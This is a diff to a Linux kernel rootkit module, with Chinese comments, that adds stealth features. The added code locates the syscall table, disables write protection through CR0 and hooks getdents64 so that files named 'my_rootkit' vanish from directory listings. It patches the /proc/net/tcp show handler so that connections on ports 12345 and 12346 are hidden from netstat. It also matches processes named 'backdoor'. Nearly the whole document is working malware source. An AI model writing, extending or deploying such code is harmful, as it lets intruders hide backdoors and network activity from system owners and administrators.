@@ -10,9 +10,11 @@
 #include <linux/fcntl.h>
 #include <linux/fs.h>
 //get_ds() set_fs() get_fs()
-#include <asm/processor.h>
-#include <asm/uaccess.h>
-
+//#include <asm/processor.h>
+//#include <asm/uaccess.h>
+//hide netstat
+#include <net/tcp.h>
+//#include <linux/proc_fs.h>
 #include "my_rootkit.h"
 
 #include <linux/version.h>
@@ -21,7 +23,6 @@
 #endif
 #ifdef LINUX26
 /*code in 3.2 kernel*/
-//#define __NR_read 3//63
 struct idt {
 	unsigned short limit;
 	unsigned long base;
@@ -35,8 +36,9 @@ struct idt_descriptor {
 } __attribute__((packed));
 
 void **sys_call_table;
+
 asmlinkage ssize_t (*original_read)(unsigned int, char *, size_t);
-asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
+
 unsigned int original_mkdir;
 
 void* get_system_call(void)
@@ -54,10 +56,8 @@ void* get_sys_call_table(void* system_call)
 	unsigned long s_c_t;
 	int count = 0;
 	
-	//my_rootkit_debug(KERN_DEBUG "Here I am: %s:%i\n", __FILE__, __LINE__);
 	p = (unsigned char *)system_call;
 	while (!((*p==0xff)&&(*(p+1)==0x14)&&(*(p+2)==0x85))) {
-		//my_rootkit_debug(KERN_ALERT "p = 0x%x, count=%d\n", (unsigned int)p, count);
 		p++;
 		if (count++ > 100) {
 			count = -1;
@@ -104,24 +104,109 @@ asmlinkage ssize_t my_rootkit_read(int fd, char *buf, size_t count)
 	static int i = 0;
 	if (i == 0) {
 		i = 1;
-		my_rootkit_debug(KERN_ALERT "This is in my read\n");
+		my_rootkit_debug("This is in my read\n");
 	}
 	ret = (*original_read)(fd, buf, count);
 	return ret;
 }
+//hide files and processes
+static char *processname = "backdoor";
+struct task_struct* get_task(pid_t pid)
+{
+    struct task_struct *p = get_current(),*entry=NULL;
+    list_for_each_entry(entry,&(p->tasks),tasks)
+    {
+        if(entry->pid == pid)
+        {
+            printk(KERN_DEBUG "pid found=%d\n",entry->pid);
+            return entry;
+        }
+        else
+        {
+        	printk(KERN_DEBUG "pid=%d not found\n",pid);
+        }
+    }
+    return NULL;
+}
+int myatoi(char *str)
+{
+    int res = 0, mul = 1;
+    char *ptr = NULL;
 
+    for (ptr = str + strlen(str) - 1; ptr >= str; ptr--)
+    {
+        if (*ptr < '0' || *ptr > '9')
+            return (-1);
+        res += (*ptr - '0') * mul;
+        mul *= 10;
+    }
+    if(res > 0 && res < 9999)
+        printk(KERN_INFO "pid=%d,",res);
+    printk("\n");
+    return (res);
+}
+static char* get_name(struct task_struct *p, char *buf)
+{
+    int i;
+    char *name = NULL;
+	unsigned char c;
+
+	if (NULL == p || NULL == buf) return NULL;
+	my_rootkit_debug("task->comm:%s\n", p->comm);
+    name = p->comm;
+    i = sizeof(p->comm);
+    do {
+		c = *name;
+        name++;  i--;
+        *buf = c;
+        if (!c) break;
+        if (c == '\\') {
+            buf[1] = c;
+            buf += 2;
+            continue;
+        }
+        if (c == '\n')
+        {
+            buf[0] = '\\';
+            buf[1] = 'n';
+            buf += 2;
+            continue;
+        }
+        buf++;
+    } while (i);
+    *buf = '\n';
+    return buf + 1;
+}
+static int get_process(pid_t pid)
+{
+    struct task_struct *task = get_task(pid);
+    char buffer[64] = "0";
+
+    if (task)
+    {
+        get_name(task, buffer);
+        if(pid>0 && pid<9999)
+    	    my_rootkit_debug("task name=%s\n", buffer);
+        if(strstr(buffer, processname)) return 1;
+        else return 0;
+    }
+    else return 0;
+}
+static int is_hide(char *str)
+{
+	return 0;
+}
+asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
+asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 asmlinkage long my_rootkit_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) 
 { 
 	unsigned int bufLength, recordLength, modifyBufLength;
 	struct linux_dirent64 *dirp2, *dirp3,
 	*head = NULL, 				//进行修改时，指向正确的列表的头条记录
 	*prev = NULL; 				//进行修改时，指向列表中上一项记录
-	char hide_file[]="rootkit"; //要隐藏的文件名字
-	
-	//my_rootkit_debug(KERN_ALERT "This is in my getdents64\n");
+	char hide_file[]="my_rootkit"; //要隐藏的文件名字
 	
 	bufLength = (*original_getdents64)(fd, dirp, count); //调用原本函数得到文件夹信息
-	//my_rootkit_debug(KERN_ALERT "bufLength:%u\n", bufLength);
 	if (bufLength <= 0) return bufLength ; //如果函数调用出错，直接返回好了
 	
 	//申请内核空间
@@ -131,7 +216,6 @@ asmlinkage long my_rootkit_getdents64(unsigned int fd, struct linux_dirent64 *di
 	//把已经得到的文件夹信息从用户空间复制出来
 	if (copy_from_user(dirp2, dirp, bufLength))
 	{
-		//my_rootkit_debug(KERN_ALERT "fail to copy dirp to dirp2 \n");
 		return bufLength;
 	}
 
@@ -141,15 +225,12 @@ asmlinkage long my_rootkit_getdents64(unsigned int fd, struct linux_dirent64 *di
 	while (((unsigned long)dirp3) < (((unsigned long)dirp2) + bufLength))
 	{      
 		recordLength = dirp3->d_reclen;
-		//my_rootkit_debug(KERN_ALERT "length:%u ",recordLength); 
-
 		if (recordLength == 0)
 		{
 			//有些文件系统getdents函数没能正确运行 
 			break;
 		}
 		// 是否是我们要隐藏的文件 
-		//my_rootkit_debug(KERN_ALERT "file_name=%s\n", dirp3->d_name);
 		if (strncmp(dirp3->d_name, hide_file, strlen(hide_file)) == 0)
 		{        
 			if (!prev) //整个列表中的第一个记录就是我们要隐藏的文件
@@ -176,83 +257,131 @@ asmlinkage long my_rootkit_getdents64(unsigned int fd, struct linux_dirent64 *di
 	return modifyBufLength;
 }
 
-struct proc_dir_entry * my_rootkit_dir;
-struct proc_dir_entry * my_rootkit_files;
-ino_t my_rootkit_ino;
-#define DMODE S_IFDIR|S_IRUGO|S_IXUGO
-#define FMODE S_IFREG|S_IRUGO
-//Initialize the module
-/*
-#define KERN_EMERG    "<0>"    // system is unusable 
-#define KERN_ALERT    "<1>"    // action must be taken immediately 
-#define KERN_CRIT     "<2>"    // critical conditions 
-#define KERN_ERR      "<3>"    // error conditions 
-#define KERN_WARNING  "<4>"    // warning conditions 
-#define KERN_NOTICE   "<5>"    // normal but significant 
-#define KERN_INFO     "<6>"    // informational 
-#define KERN_DEBUG    "<7>"    // debug-level messages 
-*/
-int my_rootkit_init(void)
+//hide netstat
+#define MY_TMPSZ 150 //tcp_ipv4.c line 2497
+typedef int(*TCP4_SEQ_SHOW)(struct seq_file*,void*);
+TCP4_SEQ_SHOW orig_tcp4_seq_show = NULL;
+static int g_hide_ports[] = {12345, 12346, 0};
+
+static struct proc_dir_entry* find_proc_tcp(void)
+{
+	struct proc_dir_entry *p = NULL;
+	if (NULL==init_net.proc_net || NULL==init_net.proc_net->subdir) {
+		my_rootkit_debug("Failed to find tcp from /proc\n");
+		return NULL;
+	}
+	p = init_net.proc_net->subdir;
+	//my_rootkit_debug("/proc/net/%s\n", p->name);
+	while (p && strcmp(p->name,"tcp")) {
+		//my_rootkit_debug("/proc/net/%s\n", p->name);
+		p = p->next;
+	}
+	return p;
+}
+char* strnstr(const char *src, const char *needle, size_t n)
+{
+	char *s = strstr(src, needle);
+	if (NULL == s) return NULL;
+	if (s-src+strlen(needle) <= n)
+		return s;
+	else return NULL;
+}
+int my_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+	int i = 0, r = 0;
+	char port[12];
+	char *s = NULL;
+
+	r = orig_tcp4_seq_show(seq, v);
+	for (i = 0; g_hide_ports[i]; i++) {
+		sprintf(port, ":%04X", g_hide_ports[i]);
+		//my_rootkit_debug("\n\n++++++++count=%d port=%s\n",seq->count,port);
+		//my_rootkit_debug("========one msg:\n%s\n",seq->buf+seq->count-MY_TMPSZ);
+		s = strnstr(seq->buf+seq->count-MY_TMPSZ, port, MY_TMPSZ);
+		if (s) {
+			//my_rootkit_debug("=========Find dist=%d\n",s-(seq->buf+seq->count-MY_TMPSZ));
+			//my_rootkit_debug("buf:%s\n", seq->buf);
+			seq->count -= MY_TMPSZ;
+			break;
+		}
+		else {
+			//my_rootkit_debug("=========Not Find\n");
+			//my_rootkit_debug("buf:%s\n", seq->buf);
+		}
+	}
+
+	return r;
+}
+static int hack_tcp4_seq_show(TCP4_SEQ_SHOW *old_func, TCP4_SEQ_SHOW new_func)
+{
+	struct proc_dir_entry *pde = NULL;
+	struct tcp_seq_afinfo *t_afinfo = NULL;
+	const char *err = "Failed to hack tcp4_seq_show!";
+
+	//my_rootkit_debug("===Here is in hack_tcp4_seq_show\n");
+	//my_rootkit_debug("init_net=%p\n", &init_net);
+	
+	pde = find_proc_tcp();
+	if (NULL == pde) {
+       my_rootkit_debug("%s pde is NULL\n", err);
+	   return -1;
+	}
+	t_afinfo = (struct tcp_seq_afinfo*)pde->data;
+	if (NULL == t_afinfo) {
+		my_rootkit_debug("%s t_afinfo is NULL\n", err);
+		return -1;
+	}
+	if (NULL == t_afinfo->seq_ops.show) {
+		my_rootkit_debug("%s orig_tcp4_seq_show is NULL\n", err);
+		return -1;
+	}
+	if (NULL != old_func) {
+		*old_func = t_afinfo->seq_ops.show;
+	}
+	if (NULL == new_func) {
+		my_rootkit_debug("%s new tcp4_seq_show is NULL\n", err);
+		return -1;
+	}
+	t_afinfo->seq_ops.show = new_func;
+	return 0;
+}
+static int __init my_rootkit_init(void)
 {
 	void *system_call;
 	unsigned int cr0;
 	
-	my_rootkit_debug(KERN_ALERT "Begin in init_module\n");
-#if 0
-	my_rootkit_dir = create_proc_entry(MODULE_NAME, DMODE, &proc_root);
-    if(my_rootkit_dir == 0x0) {
-		my_rootkit_debug(KERN_ALERT "create my_rootkit_dir\n");
-		return EINVAL;
-	}
-    my_rootkit_ino = my_rootkit_dir->low_ino;
-	
-	my_rootkit_files = create_proc_entry("files", FMODE, my_rootkit_dir);
-    if(my_rootkit_files == 0x0) {
-		my_rootkit_debug(KERN_ALERT "create my_rootkit_files\n");
-		return EINVAL;
-	}
-    //my_rootkit_files->read_proc = my_rootkit_read_files;
-#endif
+	my_rootkit_debug("Begin in init_module\n");
+
 	system_call = get_system_call();
-	//my_rootkit_debug(KERN_ALERT "Address of system_call: 0x%x\n", (unsigned int)system_call);
-	
 	sys_call_table = (void**)get_sys_call_table(system_call);
 	if (sys_call_table == 0) {
-		my_rootkit_debug(KERN_DEBUG "Failed to get sys_call_table\n");
+		my_rootkit_debug("Failed to get sys_call_table\n");
 		return 0;
 	}
-	//my_rootkit_debug(KERN_ALERT "Address of sys_call_table: 0x%x\n", (unsigned int)sys_call_table);
-	//my_rootkit_debug(KERN_ALERT "__NR_read=%d, 0x%x\n", __NR_read, (unsigned int)(sys_call_table+__NR_read));
-	//my_rootkit_debug(KERN_ALERT "address = 0x%0x\n", (unsigned int)*(sys_call_table+__NR_read));
  
-	//original_read = sys_call_table[__NR_read];
 	original_getdents64 = sys_call_table[__NR_getdents64];
-	//original_mkdir = (unsigned int)sys_call_table[__NR_mkdir];
-	
 	cr0 = clear_cr0_save();
-	//sys_call_table[__NR_mkdir] = (void*)&my_rootkit_mkdir;
-	//sys_call_table[__NR_read] = (void*)&my_rootkit_read;
+	//hide net state
+	hack_tcp4_seq_show(&orig_tcp4_seq_show, my_tcp4_seq_show);
+	//
 	sys_call_table[__NR_getdents64] = my_rootkit_getdents64;	
 	setback_cr0(cr0);
 	
-	//my_rootkit_debug(KERN_ALERT "address = 0x%0x\n", (unsigned int)*(sys_call_table+__NR_read));
-	my_rootkit_debug(KERN_ALERT "End in init_module\n");
+	my_rootkit_debug("End in init_module\n");
 	return 0;
 }
 //Exit the module
-void my_rootkit_exit(void)
+static void __exit my_rootkit_exit(void)
 {
 	unsigned int cr0;
-	my_rootkit_debug(KERN_ALERT "Begin in cleanup_module\n");
+	my_rootkit_debug("Begin in cleanup_module\n");
 
 	cr0 = clear_cr0_save();
-	//sys_call_table[__NR_read] = original_read;
-	//sys_call_table[__NR_mkdir] = (void*)original_mkdir;
-	if(sys_call_table && sys_call_table[__NR_getdents64] == my_rootkit_getdents64)
-		sys_call_table[__NR_getdents64] = original_getdents64;  
+	if (orig_tcp4_seq_show)
+		hack_tcp4_seq_show(NULL, orig_tcp4_seq_show);
+	sys_call_table[__NR_getdents64] = original_getdents64;  
 	setback_cr0(cr0);
-	//my_rootkit_debug(KERN_ALERT "address = 0x%0x\n", (unsigned int)*(sys_call_table+__NR_read));
-	my_rootkit_debug(KERN_ALERT "End in cleanup_module\n");
+	my_rootkit_debug("End in cleanup_module\n");
 }
 MODULE_AUTHOR("ChHuWaLi");
 MODULE_LICENSE("Dual BSD/GPL");
